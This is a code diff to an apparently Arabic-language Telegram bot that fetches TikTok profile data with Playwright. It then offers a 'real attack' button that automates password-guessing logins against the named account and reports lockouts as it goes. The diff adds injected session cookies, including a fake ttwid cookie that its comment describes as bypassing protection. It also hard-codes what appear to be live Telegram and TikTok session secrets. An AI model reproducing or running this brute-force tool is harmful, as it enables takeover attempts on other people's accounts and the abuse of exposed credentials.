@@ -15,11 +15,14 @@ from playwright.async_api import async_playwright
 # ║                                                          ║
 # ╚══════════════════════════════════════════════════════════╝
 
-# ← ضع توكن البوت هنا (من @BotFather)
+# ← ضع توكن البوت هنا
 TELEGRAM_TOKEN = "8974546244:AAGSIwbh9FmENOiKYP2tS33_Z-ixjPl0cl4"
 
-# ← ضع msToken هنا (من Chrome على اللابتوب)
-MS_TOKEN = "O70pe_t0upi_s9dYP1i5J7pgpYHQpY6GR84dEalaHPF85-0BzMQvyoRInHm0rMLBe84zxmYsQoo8we5yNjS7YMxVi83I6x8lWV990nvbeoPqZ1lV8jtRgVsN-MdcOzRsgoDOukfb_KTGYPy3vGD5q1XJBwAZ6itG1CZLT2BZ"
+# ← ضع sessionid هنا (الأهم)
+MY_SESSION_ID = "2b561f291082146c8b50a6cff32a5f50"
+
+# ← ضع msToken هنا (اختياري، لدعم إضافي)
+MY_MS_TOKEN = "O70pe_t0upi_s9dYP1i5J7pgpYHQpY6GR84dEalaHPF85-0BzMQvyoRInHm0rMLBe84zxmYsQoo8we5yNJS7YMxVI83l6x8lWV990nvbeoPqZ1IV8jtRgVsN-MdcOzRsgoDOukfb_KYGYPy3vGD5q1XJBwAZ6ifG1CzLT2BZ"
 
 # ╔══════════════════════════════════════════════════════════╗
 # ║                                                          ║
@@ -27,9 +30,9 @@ MS_TOKEN = "O70pe_t0upi_s9dYP1i5J7pgpYHQpY6GR84dEalaHPF85-0BzMQvyoRInHm0rMLBe84z
 # ║                                                          ║
 # ╚══════════════════════════════════════════════════════════╝
 
-# قراءة القيم من متغيرات البيئة (إذا كانت متوفرة)، وإلا استخدم القيم اللي فوق
 TOKEN = os.environ.get("TELEGRAM_TOKEN", TELEGRAM_TOKEN)
-MY_MS_TOKEN = os.environ.get("MY_MS_TOKEN", MS_TOKEN)
+SESSION_ID = os.environ.get("MY_SESSION_ID", MY_SESSION_ID)
+MS_TOKEN = os.environ.get("MY_MS_TOKEN", MY_MS_TOKEN)
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
@@ -51,57 +54,136 @@ async def start_web_server():
     logging.info(f"✅ Web server started on port {port}")
 
 # ============================================================
-# 2. دالة جلب معلومات الحساب
+# 2. دالة إعداد الكوكيز (sessionid + msToken + كوكيزات إضافية)
+# ============================================================
+async def setup_cookies(context):
+    """
+    تضيف كل الكوكيز المهمة للـ Context
+    """
+    cookies_to_add = [
+        {
+            "name": "sessionid",
+            "value": SESSION_ID,
+            "domain": ".tiktok.com",
+            "path": "/"
+        },
+        {
+            "name": "sessionid_ss",
+            "value": SESSION_ID,
+            "domain": ".tiktok.com",
+            "path": "/"
+        },
+        {
+            "name": "sid_tt",
+            "value": SESSION_ID,
+            "domain": ".tiktok.com",
+            "path": "/"
+        },
+        {
+            "name": "msToken",
+            "value": MS_TOKEN,
+            "domain": ".tiktok.com",
+            "path": "/"
+        },
+        {
+            "name": "ttwid",
+            "value": "1%7C" + SESSION_ID[:30],  # قيمة وهمية لتجاوز الحماية
+            "domain": ".tiktok.com",
+            "path": "/"
+        }
+    ]
+    
+    await context.add_cookies(cookies_to_add)
+    logging.info("✅ Cookies added successfully")
+
+# ============================================================
+# 3. دالة جلب معلومات الحساب (باستخدام sessionid)
 # ============================================================
 async def get_tiktok_user_info(username: str):
+    """
+    تفتح المتصفح، تضيف الكوكيز، وتجيب معلومات الحساب
+    """
     async with async_playwright() as p:
         try:
             browser = await p.chromium.launch(headless=True)
             context = await browser.new_context(
-                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                viewport={"width": 1280, "height": 720},
+                locale="ar-SA"
             )
             
-            await context.add_cookies([
-                {
-                    "name": "msToken",
-                    "value": MY_MS_TOKEN,
-                    "domain": ".tiktok.com",
-                    "path": "/"
-                }
-            ])
+            # إضافة كل الكوكيز
+            await setup_cookies(context)
             
             page = await context.new_page()
-            await page.goto(f"https://www.tiktok.com/@{username}",
-                          wait_until="domcontentloaded", timeout=25000)
-            await asyncio.sleep(3)
             
+            # فتح صفحة المستخدم
+            await page.goto(
+                f"https://www.tiktok.com/@{username}",
+                wait_until="domcontentloaded",
+                timeout=30000
+            )
+            await asyncio.sleep(4)  # انتظار لتحميل البيانات
+            
+            # استخراج البيانات
             data = await page.evaluate('''() => {
                 try {
                     const script = document.getElementById('__UNIVERSAL_DATA_FOR_REHYDRATION__');
-                    if (!script) return null;
+                    if (!script) {
+                        return {error: 'no_script'};
+                    }
+                    
                     const json = JSON.parse(script.textContent);
-                    const userInfo = json.__DEFAULT_SCOPE__['webapp.user-detail'].userInfo;
-                    return { user: userInfo.user, stats: userInfo.stats };
-                } catch(e) { return null; }
+                    const scope = json.__DEFAULT_SCOPE__;
+                    
+                    if (!scope || !scope['webapp.user-detail']) {
+                        return {error: 'no_user_detail', keys: Object.keys(scope || {})};
+                    }
+                    
+                    const userInfo = scope['webapp.user-detail'].userInfo;
+                    return {
+                        user: userInfo.user,
+                        stats: userInfo.stats
+                    };
+                } catch(e) {
+                    return {error: e.message};
+                }
             }''')
             
             await browser.close()
             
-            if not data:
+            # فحص الأخطاء
+            if not data or 'error' in data:
+                logging.error(f"❌ Data error: {data}")
                 return None
             
             user_obj = data.get('user', {})
             stats = data.get('stats', {})
             
-            create_time = user_obj.get("createTime", 0)
-            create_date = datetime.fromtimestamp(int(create_time)).strftime("%d-%m-%Y") if create_time else "غير معروف"
+            if not user_obj:
+                logging.error("❌ User object empty")
+                return None
             
+            # تاريخ الإنشاء
+            create_time = user_obj.get("createTime", 0)
+            if create_time:
+                try:
+                    create_date = datetime.fromtimestamp(int(create_time)).strftime("%d-%m-%Y")
+                except:
+                    create_date = "غير معروف"
+            else:
+                create_date = "غير معروف"
+            
+            # الدولة
             country = user_obj.get("region", "غير معروف")
             country_map = {
                 "SA": "السعودية 🇸🇦", "IQ": "العراق 🇮🇶", "AE": "الإمارات 🇦🇪",
                 "EG": "مصر 🇪🇬", "KW": "الكويت 🇰🇼", "QA": "قطر 🇶🇦",
                 "JO": "الأردن 🇯🇴", "MA": "المغرب 🇲🇦", "DZ": "الجزائر 🇩🇿",
-                "TN": "تونس 🇹🇳", "US": "أمريكا 🇺🇸", "GB": "بريطانيا 🇬🇧"
+                "TN": "تونس 🇹🇳", "US": "أمريكا 🇺🇸", "GB": "بريطانيا 🇬🇧",
+                "SY": "سوريا 🇸🇾", "LB": "لبنان 🇱🇧", "YE": "اليمن 🇾🇪",
+                "OM": "عمان 🇴🇲", "BH": "البحرين 🇧🇭", "LY": "ليبيا 🇱🇾",
+                "SD": "السودان 🇸🇩", "PS": "فلسطين 🇵🇸"
             }
             country_name = country_map.get(country, country)
             
@@ -118,28 +200,33 @@ async def get_tiktok_user_info(username: str):
                 'verified': user_obj.get("verified", False),
                 'signature': user_obj.get("signature", "")
             }
+        
         except Exception as e:
             logging.error(f"❌ Error: {e}")
             return None
 
 # ============================================================
-# 3. تنسيق الأرقام
+# 4. تنسيق الأرقام
 # ============================================================
 def format_number(num):
     try:
         num = int(num)
-        if num >= 1_000_000: return f"{num/1_000_000:.1f}M"
-        elif num >= 1_000: return f"{num/1_000:.1f}K"
+        if num >= 1_000_000:
+            return f"{num/1_000_000:.1f}M"
+        elif num >= 1_000:
+            return f"{num/1_000:.1f}K"
         return str(num)
     except:
         return str(num)
 
 # ============================================================
-# 4. الهجوم الحقيقي
+# 5. الهجوم الحقيقي
 # ============================================================
 async def real_brute_force_attack(username: str, message_obj: types.Message):
-    common_passwords = ["123456", "password", "123456789", "qwerty",
-                        "abc123", "admin", "111111", "000000"]
+    common_passwords = [
+        "123456", "password", "123456789", "qwerty",
+        "abc123", "admin", "111111", "000000"
+    ]
     
     report = (
         f"🚀 **بدء هجوم تخمين حقيقي على @{username}**\n\n"
@@ -168,17 +255,18 @@ async def real_brute_force_attack(username: str, message_obj: types.Message):
                         viewport={"width": 1280, "height": 720}
                     )
                     
-                    await context.add_cookies([
-                        {"name": "msToken", "value": MY_MS_TOKEN,
-                         "domain": ".tiktok.com", "path": "/"}
-                    ])
+                    await setup_cookies(context)
                     
                     page = await context.new_page()
-                    await page.goto("https://www.tiktok.com/login/phone-or-email/email",
-                                  wait_until="domcontentloaded", timeout=25000)
+                    await page.goto(
+                        "https://www.tiktok.com/login/phone-or-email/email",
+                        wait_until="domcontentloaded",
+                        timeout=25000
+                    )
                     await asyncio.sleep(3)
                     
                     content = await page.content()
+                    
                     if any(kw in content.lower() for kw in ["account locked", "temporarily locked", "too many attempts"]):
                         report += f"**[محاولة {i}]** `{pwd}`\n  └─ 🔒 **الحساب مقفول بالفعل!**\n\n"
                         account_locked = True
@@ -192,10 +280,13 @@ async def real_brute_force_attack(username: str, message_obj: types.Message):
                     try:
                         email_input = await page.wait_for_selector('input[type="text"]', timeout=5000)
                         await email_input.fill(username)
+                        
                         password_input = await page.wait_for_selector('input[type="password"]', timeout=5000)
                         await password_input.fill(pwd)
+                        
                         login_btn = await page.wait_for_selector('button[type="submit"]', timeout=5000)
                         await login_btn.click()
+                        
                         await asyncio.sleep(4)
                         
                         page_content = await page.content()
@@ -224,14 +315,17 @@ async def real_brute_force_attack(username: str, message_obj: types.Message):
                     
                     try:
                         await msg.edit_text(report, parse_mode="Markdown")
-                    except: pass
+                    except:
+                        pass
                     
                     await asyncio.sleep(3)
+                
                 except Exception as e:
                     report += f"  └─ ❌ خطأ: {str(e)[:50]}\n\n"
                     continue
             
             await browser.close()
+        
         except Exception as e:
             logging.error(f"❌ Playwright Error: {e}")
             report += f"\n❌ **خطأ:** {str(e)[:100]}\n"
@@ -265,7 +359,7 @@ async def real_brute_force_attack(username: str, message_obj: types.Message):
         logging.error(f"Edit error: {e}")
 
 # ============================================================
-# 5. أوامر البوت
+# 6. أوامر البوت
 # ============================================================
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
@@ -278,15 +372,23 @@ async def cmd_start(message: types.Message):
 @dp.message()
 async def check_tiktok_handler(message: types.Message):
     username = message.text.strip().replace("@", "")
+    
     if not username:
         await message.answer("❌ أرسل يوزر صحيح.")
         return
     
     processing_msg = await message.answer(f"⏳ جاري جلب بيانات @{username} ...")
+    
     data = await get_tiktok_user_info(username)
     
     if not data:
-        await processing_msg.edit_text("❌ تعذر جلب البيانات. تأكد من msToken.")
+        await processing_msg.edit_text(
+            "❌ **تعذر جلب البيانات.**\n\n"
+            "الأسباب:\n"
+            "• sessionid منتهي\n"
+            "• الحساب غير موجود\n"
+            "• TikTok غيّر طريقة العرض"
+        )
         return
     
     verified_badge = " ✅" if data['verified'] else ""
@@ -306,7 +408,11 @@ async def check_tiktok_handler(message: types.Message):
     builder = InlineKeyboardBuilder()
     builder.button(text="🔐 ابدأ الهجوم الحقيقي", callback_data=f"realhack_{username}")
     
-    await processing_msg.edit_text(info_text, reply_markup=builder.as_markup(), parse_mode="Markdown")
+    await processing_msg.edit_text(
+        info_text,
+        reply_markup=builder.as_markup(),
+        parse_mode="Markdown"
+    )
 
 @dp.callback_query(lambda c: c.data.startswith("realhack_"))
 async def process_real_hack(callback: types.CallbackQuery):
@@ -315,7 +421,7 @@ async def process_real_hack(callback: types.CallbackQuery):
     await real_brute_force_attack(username, callback.message)
 
 # ============================================================
-# 6. التشغيل
+# 7. التشغيل
 # ============================================================
 async def main():
     logging.basicConfig(level=logging.INFO)
